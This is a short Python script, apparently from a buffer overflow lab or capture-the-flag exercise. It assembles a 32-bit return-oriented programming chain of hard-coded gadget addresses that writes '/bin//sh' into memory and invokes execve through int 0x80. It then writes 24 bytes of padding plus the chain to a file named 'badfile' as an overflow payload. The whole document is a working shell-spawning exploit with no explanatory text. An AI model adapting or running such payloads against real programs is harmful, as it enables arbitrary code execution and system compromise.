from struct import pack
p = b''
p += pack('<I', 0x0806f0bb)  # pop edx ; ret
p += pack('<I', 0x080dc060)  # @ .data
p += pack('<I', 0x080aa356)  # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08057b1a)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f0bb)  # pop edx ; ret
p += pack('<I', 0x080dc064)  # @ .data + 4
p += pack('<I', 0x080aa356)  # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08057b1a)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f0bb)  # pop edx ; ret
p += pack('<I', 0x080dc068)  # @ .data + 8
p += pack('<I', 0x080570e0)  # xor eax, eax ; ret
p += pack('<I', 0x08057b1a)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0804901e)  # pop ebx ; ret
p += pack('<I', 0x080dc060)  # @ .data
p += pack('<I', 0x0806f0e2)  # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080dc068)  # @ .data + 8
p += pack('<I', 0x080dc060)  # padding without overwrite ebx
p += pack('<I', 0x0806f0bb)  # pop edx ; ret
p += pack('<I', 0x080dc068)  # @ .data + 8
p += pack('<I', 0x080570e0)  # xor eax, eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0807c4ea)  # inc eax ; ret
p += pack('<I', 0x0804a31a)  # int 0x80

with open('badfile', 'wb') as f:
    f.write(b'A' * 24 + p)

